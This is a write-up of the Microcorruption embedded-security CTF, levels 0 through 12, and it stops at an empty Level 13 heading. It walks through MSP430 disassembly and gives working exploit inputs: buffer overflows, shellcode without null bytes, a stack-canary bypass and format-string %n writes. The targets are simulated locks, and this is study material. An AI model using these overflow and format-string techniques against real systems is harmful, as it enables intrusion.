# Embedded Security Microcorruption writeups
## Level 0/Tutorial
Looking quickly at the program, I see a call to get_password and then a call to
check_password.  After check_password, r15 is tested with failure msg being
printed if r15 is zero.
I ran the program and broke on check_password.
When check_password is called, the addr of the user input is in r15.
```
4484 <check_password>
4484:  6e4f           mov.b @r15, r14   //grab single byte from user input and
place in r14
4486:  1f53           inc r15 #move to next byte of user_input
4488:  1c53           inc r12 #counter
448a:  0e93           tst r14 #null terminated string
448c:  fb23           jnz #0x4484 <check_password+0x0>
448e:  3c90 0900      cmp #0x9, r12 #check if the user_input was 9 bytes long
before a null terminator
4492:  0224           jeq #0x4498 <check_password+0x14> #put 1 in r15 then ret
4494:  0f43           clr r15 #return 0
4496:  3041           ret
4498:  1f43           mov #0x1, r15
449a:  3041           ret
```
From the looks of check_password i just need any password that is 9 letters
long.
I entered my password....and it didn't work.  Re-reading the code, I see that
r12 is incremented before the null byte check, so I need a password of length
8.  I try again and the door is unlocked!

## Level 1/New Orleans
```
4438 <main>
4438:  3150 9cff      add #0xff9c, sp
443c:  b012 7e44      call  #0x447e <create_password>
4440:  3f40 e444      mov #0x44e4 "Enter the password to continue", r15
4444:  b012 9445      call  #0x4594 <puts>
4448:  0f41           mov sp, r15
444a:  b012 b244      call  #0x44b2 <get_password>
444e:  0f41           mov sp, r15
4450:  b012 bc44      call  #0x44bc <check_password>
4454:  0f93           tst r15
4456:  0520           jnz #0x4462 <main+0x2a>
4458:  3f40 0345      mov #0x4503 "Invalid password; try again.", r15
445c:  b012 9445      call  #0x4594 <puts>
4460:  063c           jmp #0x446e <main+0x36>
4462:  3f40 2045      mov #0x4520 "Access Granted!", r15
4466:  b012 9445      call  #0x4594 <puts>
446a:  b012 d644      call  #0x44d6 <unlock_door>
446e:  0f43           clr r15
4470:  3150 6400      add #0x64, sp
```
Well, create_password and check_password look like they'll be interesting
```
447e <create_password>
447e:  3f40 0024      mov #0x2400, r15
4482:  ff40 4500 0000 mov.b #0x45, 0x0(r15)
4488:  ff40 4f00 0100 mov.b #0x4f, 0x1(r15)
448e:  ff40 7100 0200 mov.b #0x71, 0x2(r15)
4494:  ff40 5800 0300 mov.b #0x58, 0x3(r15)
449a:  ff40 7e00 0400 mov.b #0x7e, 0x4(r15)
44a0:  ff40 4700 0500 mov.b #0x47, 0x5(r15)
44a6:  ff40 7500 0600 mov.b #0x75, 0x6(r15)
44ac:  cf43 0700      mov.b #0x0, 0x7(r15)
44b0:  3041           ret
```
Create password is putting a bunch of hex values in to memory starting at
0x2400..i wonder if that's our password.
python -c "print '\x45\x4f\x71\x58\x7e\x47\x75'"  -- EOqX~Gu
I tried that and that was the code!

## Level 2/Sydney
```
448a <check_password>
448a:  bf90 6365 0000 cmp #0x6563, 0x0(r15)
4490:  0d20           jnz $+0x1c
4492:  bf90 5c3f 0200 cmp #0x3f5c, 0x2(r15)
4498:  0920           jnz $+0x14
449a:  bf90 642f 0400 cmp #0x2f64, 0x4(r15)
44a0:  0520           jne #0x44ac <check_password+0x22>
44a2:  1e43           mov #0x1, r14
44a4:  bf90 6f79 0600 cmp #0x796f, 0x6(r15)
44aa:  0124           jeq #0x44ae <check_password+0x24>
44ac:  0e43           clr r14
44ae:  0f4e           mov r14, r15
44b0:  3041           ret
```
When check_password is called, the userinput is in r15.
0x65 is e and 0x63 is c, so i put ec as my password, but the jump at 0x4490 was
taken!  This is because this is a little endian architecture, so i needed to
reverse the bytes.  I entered ce and made it past the first comparison.
python -c "print '\x63\x65\x5c\x3f\x64\x2f\x6f\x79'"
ce\?d/oy
I entered this as the password and unlocked the door!

## Level 3/Hanoi
Quickly looking through the source, I see test_password_valid
```
4454 <test_password_valid>
4454:  0412           push  r4
4456:  0441           mov sp, r4
4458:  2453           incd  r4
445a:  2183           decd  sp
445c:  c443 fcff      mov.b #0x0, -0x4(r4)
4460:  3e40 fcff      mov #0xfffc, r14
4464:  0e54           add r4, r14
4466:  0e12           push  r14
4468:  0f12           push  r15
446a:  3012 7d00      push  #0x7d
446e:  b012 7a45      call  #0x457a <INT>
4472:  5f44 fcff      mov.b -0x4(r4), r15
4476:  8f11           sxt r15
4478:  3152           add #0x8, sp
447a:  3441           pop r4
447c:  3041           ret
```
This code has INT 0x7d.  Looking that interrupt up in the
[manual](https://microcorruption.com/manual.pdf) I see that this is used to
"Interface with the HSM-1. Set a flag in memory if the password passed in is
correct.
Takes two arguments. The first argument is the password to test, the
second is the location of a flag to overwrite if the password is correct"
Hmm...it seems like my days of reading the password out of the memory are over.  
Scrolling through the strings, I saw "Remember: passwords are between 8 and 16
characters", however the call to getsn allows 0x1c (28) characters.  
login() excerpt
```
4534:  3e40 1c00      mov #0x1c, r14
4538:  3f40 0024      mov #0x2400, r15
453c:  b012 ce45      call  #0x45ce <getsn>
4540:  3f40 0024      mov #0x2400, r15
4544:  b012 5444      call  #0x4454 <test_password_valid>
4548:  0f93           tst r15
454a:  0324           jz  $+0x8 #if password is not valid, skip the next
statement
454c:  f240 a500 1024 mov.b #0xa5, &0x2410 #this gets run if pass is valid
4552:  3f40 d344      mov #0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call  #0x45de <puts>
455a:  f290 2800 1024 cmp.b #0x28, &0x2410
4560:  0720           jne #0x4570 <login+0x50>  #this is a jump to the failure
case
```
Looking at the coe, it looks like the code on 0x454c is incorrect and should be
moving #0x28 in to 0x2410, instead of moving in #0xa5.  Regardless, since I can
control 28 bytes of characters starting at 0x2400, I can overwrite 0x2410 with
0x28.  I entered AAAAAAAAAAAAAAAA( and the door unlocked!
## Level 4/Cusco
Once again there's a call to INT 0x7d in test_password_valid, so I won't be able to pull the password
out of memory.  Let's see how test_password_valid is used in the rest of the
 code
```
4500 <login>
4500:  3150 f0ff      add #0xfff0, sp
4504:  3f40 7c44      mov #0x447c "Enter the password to continue.", r15
4508:  b012 a645      call  #0x45a6 <puts>
450c:  3f40 9c44      mov #0x449c "Remember: passwords are between 8 and 16
characters.", r15
4510:  b012 a645      call  #0x45a6 <puts>
4514:  3e40 3000      mov #0x30, r14
4518:  0f41           mov sp, r15
451a:  b012 9645      call  #0x4596 <getsn>
451e:  0f41           mov sp, r15
4520:  b012 5244      call  #0x4452 <test_password_valid>
4524:  0f93           tst r15
4526:  0524           jz  #0x4532 <login+0x32>
4528:  b012 4644      call  #0x4446 <unlock_door>
452c:  3f40 d144      mov #0x44d1 "Access granted.", r15
4530:  023c           jmp #0x4536 <login+0x36>
4532:  3f40 e144      mov #0x44e1 "That password is not correct.", r15
4536:  b012 a645      call  #0x45a6 <puts>
453a:  3150 1000      add #0x10, sp
453e:  3041           ret
```
Ok, so getsn(0x30, 0x43ee) and then test_password_valid-0x43ee this means I
control memory from 0x43ee to 0x441d.  At the end of login, the retaddr is
stored at 0x43fe (note the add 0x10 sp on 0x453a).  This means we can jump to
any arbitrary location in code we want by entering 16 characters and then our
return address (in little endian).  unlock_door (0x4446) looks like a good place to go
to, so I entered AAAAAAAAAAAAAAAAFD and the door unlocked.

## Level 5 / Reykjavik
Looking through the code I didn't see my expected login, unlock_door, etc
functions.  Instead, main looked like:
```
4438 <main>
4438:  3e40 2045      mov #0x4520, r14
443c:  0f4e           mov r14, r15
443e:  3e40 f800      mov #0xf8, r14
4442:  3f40 0024      mov #0x2400, r15
4446:  b012 8644      call  #0x4486 <enc>
444a:  b012 0024      call  #0x2400
444e:  0f43           clr r15
```
So it looks like the program has been encoded somehow and is going to be
decoded before execution.  I'm guessing the enc()  program actually decodes
everything that's going to be run.  If this was gdb, I'd break on 0x2400 and
then disassembly it.  Alas, it isn't...so instead I wait till I'm prompted for
a password and then step out.  At this point the pc is 0x2444.  Somewhere
around here is probably the password check, so I'll use the handy
[assembler/disassembler](https://microcorruption.com/assembler) to see what's
going on.
```
3150 0600      add  #0x6, sp
b490 1428 dcff cmp  #0x2814, -0x24(r4)
0520           jnz  $+0xc
3012 7f00      push #0x7f
b012 6424      call #0x2464
2153           incd sp
3150 2000      add  #0x20, sp
3441           pop  r4
```
It looks like it's checking some part of my password and comparing it to
0x2814.
r4=0x43fe, so 0x43fe-0x24 = 0x43da, which is the start of my password.  I enter
1428 and click the hex input box, and the door unlocks!
### Level 6 / Whitehorse

```
44f4 <login>
44f4:  3150 f0ff      add #0xfff0, sp
44f8:  3f40 7044      mov #0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call  #0x4596 <puts>
4500:  3f40 9044      mov #0x4490 "Remember: passwords are between 8 and 16
characters.", r15
4504:  b012 9645      call  #0x4596 <puts>
4508:  3e40 3000      mov #0x30, r14
450c:  0f41           mov sp, r15
450e:  b012 8645      call  #0x4586 <getsn>
4512:  0f41           mov sp, r15
4514:  b012 4644      call  #0x4446 <conditional_unlock_door>
4518:  0f93           tst r15
451a:  0324           jz  #0x4522 <login+0x2e>
451c:  3f40 c544      mov #0x44c5 "Access granted.", r15
4520:  023c           jmp #0x4526 <login+0x32>
4522:  3f40 d544      mov #0x44d5 "That password is not correct.", r15
4526:  b012 9645      call  #0x4596 <puts>
452a:  3150 1000      add #0x10, sp
```
So again we're getting 0x30 bytes of input from getsn() and the stack pointer
is being adjusted by 0x10 bytes at the end, so we should be able to do a buffer
overflow.  The main difference is instead of unlock_door, we have
conditional_unlock_door
```
4446 <conditional_unlock_door>
4446:  0412           push  r4
4448:  0441           mov sp, r4
444a:  2453           incd  r4
444c:  2183           decd  sp
444e:  c443 fcff      mov.b #0x0, -0x4(r4)
4452:  3e40 fcff      mov #0xfffc, r14
4456:  0e54           add r4, r14
4458:  0e12           push  r14
445a:  0f12           push  r15
445c:  3012 7e00      push  #0x7e
4460:  b012 3245      call  #0x4532 <INT>
4464:  5f44 fcff      mov.b -0x4(r4), r15
4468:  8f11           sxt r15
446a:  3152           add #0x8, sp
446c:  3441           pop r4
446e:  3041           ret
```
This function uses INT 0x7e, which only unlocks the door if the password is
correct.  What we want is INT 0x7f, which unconditionally unlcoks the door.  
Perhaps I can write shellcode to trigger 0x7f directly on the stack and then
overwrite the return address with my address on the stack.
To test this I entered 
```
PUSH 0X7F
CALL 0X4532
```
in to the assembler and got 10127f0090123245 as the result.  I then ran it with
414141414141414110127f00901232458788 as my input, and saw my PC was overwritten
with 8887, and that my shellcode was at 0x3a80.  
I modified my input to 414141414141414110127f0090123245803a and got an error
about load address unaligned, but I was within my shellcode!
Stepping through my shellcode, I saw that 0x7f was not being placed on the
stack prior to my interrupt call.  Looking at the manual, I saw i should have
had push #0x7f in the assembler to indicate that I wanted the value/constant
0x7f; additionally, I needed to do the same for the call function.  After
correction both of these, my input became 414141414141414130127f00b0123245803a,
which unlocked the door!
### Level 7 / Montevideo
Quickly looking through the code, I see there is again a
conditional_unlock_door, and that there is now a strcpy() and memset()
functionality included.
```
44f4 <login>
44f4:  3150 f0ff      add #0xfff0, sp
44f8:  3f40 7044      mov #0x4470 "Enter the password to continue.", r15
44fc:  b012 b045      call  #0x45b0 <puts>
4500:  3f40 9044      mov #0x4490 "Remember: passwords are between 8 and 16
characters.", r15
4504:  b012 b045      call  #0x45b0 <puts>
4508:  3e40 3000      mov #0x30, r14
450c:  3f40 0024      mov #0x2400, r15
4510:  b012 a045      call  #0x45a0 <getsn>
4514:  3e40 0024      mov #0x2400, r14
4518:  0f41           mov sp, r15
451a:  b012 dc45      call  #0x45dc <strcpy>
451e:  3d40 6400      mov #0x64, r13
4522:  0e43           clr r14
4524:  3f40 0024      mov #0x2400, r15
4528:  b012 f045      call  #0x45f0 <memset>
452c:  0f41           mov sp, r15
452e:  b012 4644      call  #0x4446 <conditional_unlock_door>
4532:  0f93           tst r15
4534:  0324           jz  #0x453c <login+0x48>
4536:  3f40 c544      mov #0x44c5 "Access granted.", r15
453a:  023c           jmp #0x4540 <login+0x4c>
453c:  3f40 d544      mov #0x44d5 "That password is not correct.", r15
4540:  b012 b045      call  #0x45b0 <puts>
4544:  3150 1000      add #0x10, sp
4548:  3041           ret
```
getsn again allows 0x30 bytes to be used and stores the string at 0x2400.
After the call to getsn, we see a call to strcpy, copying the input string to
the sp.  After this, memset is clearing out 0x64 bytes starting at 0x2400.
Since the strcpy() is unconditional, we can copy up to the 0x30 bytes that
getsn allowed, which means we can overwrite the return address to gain
execution, similar to what we did for previous levels. The difference is since
strcpy() is being used, my shellcode can't contain any null bytes, since
strcpy() stops copying once a null byte occurs.  The push #0x7f is the command
that was introducing the null byte, since the word size is 2 bytes, 0x7f is
really 0x007f.  There simple approach I took to avoid a null byte was to do:
```
mov #0x0180, r7
sub #0x0101, r7 
push r7
call #0x454c (INT addr changed for this prog)
```
I entered my input 37408001378001010712b0124c454141ee43 and the door unlocked!
### Level 8 /  Johannesburg
"This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected."
Uh oh.
Looking at login() I see that there is now a test_password_valid function that
exits out of the function if it returns false (presumably if the password is
too long).  However, this is after the input is entered by getsn and copied
with strcpy, so hopefully we can still just do a simple buffer overflow to win.
At the end of strcpy() 0x12 is being added to sp.  getsn() allows 0x3f bytes to
be copied.  
I entered my long string and broke at the end of login, but my program did not
reach there.
Looking at the login() function I see the following snippet:
```
4574:  b012 f845      call  #0x45f8 <puts>
4578:  f190 4000 1100 cmp.b #0x40, 0x11(sp)
457e:  0624           jeq #0x458c <login+0x60>
4580:  3f40 ff44      mov #0x44ff "Invalid Password Length: password too
long.", r15
4584:  b012 f845      call  #0x45f8 <puts>
4588:  3040 3c44      br  #0x443c <__stop_progExec__>
458c:  3150 1200      add #0x12, sp
4590:  3041           ret
```
It looks like the program is checking for a stack canary, and if that value's
not present, it is exiting out, before getting to the ret (the ret is what
pop's our arbitrary addr off of the stack and gains us execution).  So, let's make sure that value is present on
the stack!
17 bytes in to our stack we need to have the value 0x40.  If the stack had been
set up as it was on previous levels (with an add #0x12, sp before the ret) the
17th byte would have been our return addr and would have complicated this
exploit.
Instead, this was basically the same as the previous label, but with the
addition of needing to put the stack canary in.  I used the input
37408001378001010712b012944541414140ec43 and unlocked the door!
### Level 9 / Santa Cruz
Looking through the code I see that unlock_door is now back as a function!
There is now a test_username_and_password function.  Since the HSM only
supports one value being stored, I'm guessing the either the username or
password can be found in memory.
sp = 0x43a0
Username is called with getsn(0x2404, 0x63)
Username is then strcpy'd to: 0x43a2
password is called with getsn(0x2404, 0x63)
password is then strcpy'd to: 0x43b5

The end of login() has add 0x28, sp pop r4 and pop r11, so need to overwrite a
return address 0x2c bytes off of stack, ox43cc or 34 bytes after the username
or 23 bytes after the password.
I decided to do some dynamic reverse engineering on this one since the login()
function was so long.  I noticed that there were checks for the password
length (min and max) but didn't appear to be any on the username.
The maximum length value is stored at 0x43b4 (0x12 above the username) and the
minimum length value is stored at 0x43b3 (0x11 above the username).  I should
be able to overwrite those values to have an arbitrary length password!
There is also a check for a null byte at 0x12 bytes above the password, so i
need the password length to be 17 so strcpy() will place the null there.
However, the username can still extend beyond that (since the username strcpy
happens first).  After all of the username input, I'll overwrite the return
addr with where I want to go.  Fortunately this program has the unlock_door
function, so i'll simply overwrite the return addr with its value 0x444a.
username - 414141414141414141414141414141414101ff41414141414141414141414141414141414343434343434a44
password - 4242424242424242424242424242424242
### Level 10 /  Jakarta
Taking a look at the strings I see that username + password must be < 32.  In
the code, I also see a string for password too long.  Perhaps this means
there's not actually logic checking to see if my username is too long -- nope,
long username just prints the password too long error message.
username stored at 0x2402 and can be 0xff long
After username is entered they calculate the strlen and store it in r11
Then they call strcpy and copy the string to the top of the stack.
Unfortunately, the sp is too far away from the pc to simply overwrite the
memory at pc.
After the strcpy, they check to see if the length was > 32.  If it is, it exits
out, otherwise it prompts for password.
Username gets copied to: 0x3ff2  (we control 0x3ff2 to 0x40f1 or to 0x4012 if
we execution to continue forward).
Password can be up to 0x1ff bytes long.
Password gets copied to: 0x3ff2+len(username Max=32) -- 0x4012
We control 0x3ff2 to 0x4211 between username and password (null byte seperator) (password is 0x4012
to 0x4211)
After the password is entered and strcpied, they compare the length to 32 and
exit if it's too long.  However, they do a cmp.b for the comparison, which is a
byte comparison.  In my case, username+password was 0x21f length, but since
0x1f is < 0x20, program execution continued.
Next, test_username_and_password_valid(sp) is called.  This function is
checking to see if the password entered is correct.  It returns non-zero if the
correct password was entered.  Since we didn't enter the correct password, we
take a different code path and have 'that password is not correct' displayed.
0x22 is added to the stack and 1 value popped.  Since I control to 0x4211, I
can overwrite the ret addr that is going to be called at the end of login and
control where we go.  unlock_door (0x444c) seems like a good choice.
I entered BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB for the username and
AAAALDCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
for the password and the door opened (L = 0x4c, D =0x44)

### Level 11 / Addis Ababa
Looks like they're using printf now instead of puts...not sure why.
This time they instruct us to log in with username:password instead of two
separate prompts.
username/pass stored at 0x2400 with max length of 0x13
gets copied to sp+2 (incd)
test_password_valid is then called with 0x2400 as the parameter (not with the
strcpied val)
Since our input is so limited, i don't think we are going to be able to do a
buffer overflow.  Maybe this will be a format string vulnerability.
printf is being invoked w/: printf(inputstr)

```
45c8 <printf>
45c8:  0b12           push  r11
45ca:  0a12           push  r10
45cc:  0912           push  r9
45ce:  0812           push  r8
45d0:  0712           push  r7
45d2:  0412           push  r4
45d4:  0441           mov sp, r4  
45d6:  3450 0c00      add #0xc, r4 //r4 is now &userinput
45da:  2183           decd  sp 
45dc:  1b44 0200      mov 0x2(r4), r11 // r11 = userInput
45e0:  8441 f2ff      mov sp, -0xe(r4) //adjust sp to point to sp
45e4:  0f4b           mov r11, r15 //r11=r15=userinput
45e6:  0e43           clr r14
45e8:  0b3c           jmp #0x4600 <printf+0x38>
45ea:  1f53           inc r15
45ec:  7d90 2500      cmp.b #0x25, r13  //comparison for the % character
45f0:  0720           jne #0x4600 <printf+0x38>
45f2:  6d9f           cmp.b @r15, r13 //compare first char to second char
45f4:  0320           jne #0x45fc <printf+0x34>
45f6:  1f53           inc r15 //code path for 1st char!=2nd char  (r15 now
points to third char)
45f8:  0d43           clr r13
45fa:  013c           jmp #0x45fe <printf+0x36>
45fc:  1d43           mov #0x1, r13 //this line gets skipped depending on if
you have a repeating character
45fe:  0e5d           add r13, r14
4600:  6d4f           mov.b @r15, r13 //r13 = first byte of userinput
4602:  4d93           tst.b r13 //testing for null byte/end of string
4604:  f223           jnz #0x45ea <printf+0x22>
4606:  0f4e           mov r14, r15
4608:  0f5f           add r15, r15
460a:  2f53           incd  r15
460c:  018f           sub r15, sp
460e:  0941           mov sp, r9
4610:  0c44           mov r4, r12
4612:  2c52           add #0x4, r12
4614:  0f41           mov sp, r15
4616:  0d43           clr r13
4618:  053c           jmp #0x4624 <printf+0x5c>
461a:  af4c 0000      mov @r12, 0x0(r15) //this line looks promising, how do we
get here?
461e:  1d53           inc r13
4620:  2f53           incd  r15
4622:  2c53           incd  r12
4624:  0d9e           cmp r14, r13 //what is this comparison
4626:  f93b           jl  #0x461a <printf+0x52> //we want to take this jump!
4628:  0a43           clr r10
462a:  3740 0900      mov #0x9, r7
462e:  4a3c           jmp #0x46c4 <printf+0xfc>
4630:  084b           mov r11, r8
4632:  1853           inc r8
4634:  7f90 2500      cmp.b #0x25, r15
4638:  0624           jeq #0x4646 <printf+0x7e>
463a:  1a53           inc r10
463c:  0b48           mov r8, r11
463e:  8f11           sxt r15
4640:  b012 5045      call  #0x4550 <putchar>
4644:  3f3c           jmp #0x46c4 <printf+0xfc>
4646:  6e48           mov.b @r8, r14
4648:  4e9f           cmp.b r15, r14
464a:  0620           jne #0x4658 <printf+0x90>
464c:  1a53           inc r10
464e:  3f40 2500      mov #0x25, r15
4652:  b012 5045      call  #0x4550 <putchar>
4656:  333c           jmp #0x46be <printf+0xf6>
4658:  7e90 7300      cmp.b #0x73, r14
465c:  0b20           jne #0x4674 <printf+0xac>
465e:  2b49           mov @r9, r11
4660:  053c           jmp #0x466c <printf+0xa4>
4662:  1a53           inc r10
4664:  1b53           inc r11
4666:  8f11           sxt r15
4668:  b012 5045      call  #0x4550 <putchar>
466c:  6f4b           mov.b @r11, r15
466e:  4f93           tst.b r15
4670:  f823           jnz #0x4662 <printf+0x9a>
4672:  253c           jmp #0x46be <printf+0xf6>
4674:  7e90 7800      cmp.b #0x78, r14
4678:  1c20           jne #0x46b2 <printf+0xea>
467a:  2b49           mov @r9, r11
467c:  173c           jmp #0x46ac <printf+0xe4>
467e:  0f4b           mov r11, r15
4680:  8f10           swpb  r15
4682:  3ff0 ff00      and #0xff, r15
4686:  12c3           clrc
4688:  0f10           rrc r15
468a:  0f11           rra r15
468c:  0f11           rra r15
468e:  0f11           rra r15
4690:  1a53           inc r10
4692:  079f           cmp r15, r7
4694:  0338           jl  #0x469c <printf+0xd4>
4696:  3f50 3000      add #0x30, r15
469a:  023c           jmp #0x46a0 <printf+0xd8>
469c:  3f50 5700      add #0x57, r15
46a0:  b012 5045      call  #0x4550 <putchar>
46a4:  0b5b           add r11, r11
46a6:  0b5b           add r11, r11
46a8:  0b5b           add r11, r11
46aa:  0b5b           add r11, r11
46ac:  0b93           tst r11
46ae:  e723           jnz #0x467e <printf+0xb6>
46b0:  063c           jmp #0x46be <printf+0xf6>
46b2:  7e90 6e00      cmp.b #0x6e, r14 //0x6e = n 
46b6:  0320           jne #0x46be <printf+0xf6>
46b8:  2f49           mov @r9, r15
46ba:  8f4a 0000      mov r10, 0x0(r15)
46be:  2953           incd  r9
46c0:  0b48           mov r8, r11
46c2:  1b53           inc r11
46c4:  6f4b           mov.b @r11, r15
46c6:  4f93           tst.b r15
46c8:  b323           jnz #0x4630 <printf+0x68>
46ca:  1144 f2ff      mov -0xe(r4), sp
46ce:  2153           incd  sp
46d0:  3441           pop r4
46d2:  3741           pop r7
46d4:  3841           pop r8
46d6:  3941           pop r9
46d8:  3a41           pop r10
46da:  3b41           pop r11
46dc:  3041           ret
```
So excusing the code dump, what do we see?  I see comparisons for the '%' and
'n' characters.
I entered '%n%n' as my input and got load address unaligned: 6e25 at pc=46be.
Interesting.  I entered AA%nBB%n and broke at 0x46ba to watch what address I
was able to write to.  On the second break, I was able to write to 0x4141!  Now
all I need to do is figure out what the memory location to check if the
password is correct and we're good to go!  
After test_password_valid, r15 is moved to 0x40a6.  
I entered my input as hex encoded - "a640256e4242256e" and the door was
unlocked!
### Level 12 / Novosibrisk
Ok, this time we just have a username prompt
username - 0x2400, max length -0x1f4
username is strcpy'd to 0x420c, we control 0x420c - 0x4400
Again, I don't see anything immediately for a buffer overflow, so let's look at
format string vulnerabilities again.
I entered AA%nBB%n as my input and got a load address unaligned at 0x46bc.  The
difference this time, is that the printf is before the call to
conditional_unlock_door.  printf("%n", &addr); writes the number of characters
printed to addr, so we can write any value 1-0x1f4 to any location of our
choosing; how do we take advantage of that to exploit the program?  
There is a ret instruction at 0x10.  Perhaps we can overwrite the retAddr with
0x10 and hopefully control the stack enough to point to something useful?
I broke at 0x46b8 so i could watch what value and where i was writing to.
To overwrite ret addr, overwrite 0x4208.  
08424141414141414141414141410842256e  - that put 0x10 in to 0x4208 
084237408001378001010712b0123645
Using that input, I ended up w/ my PC at 0x420e...which is my input!  Can just
change my A's to...well I actually don't see an unlock_door() function...looks
like even with the password I'd be screwed.  Guess I'll just write my own
door_unlock!
It looks like a door unlock is just calling software interrupt 0x7f.
To do this, I'll take advantage of the shellcode I wrote in level 7
```
mov #0x0180, r7
sub #0x0101, r7 
push r7
call #0x4536 
```
Whoops, looks like that shellcode is too long for my buffer! Looks like I need to write more
efficient shellcode.  
I saw that r12 had 0x420e in it, so let's use that register and change our
shellcode to:
```
sub #0x418F, r12
push r12
call #0x4536 
```
Since we're saving an instruction here, our shellcode comes out to
3c808f410c12b0123645 and fits in the buffer!

I entered 08423c808f410c12b012364541410842256e and it unlocked! 
### Level 13 / Algiers

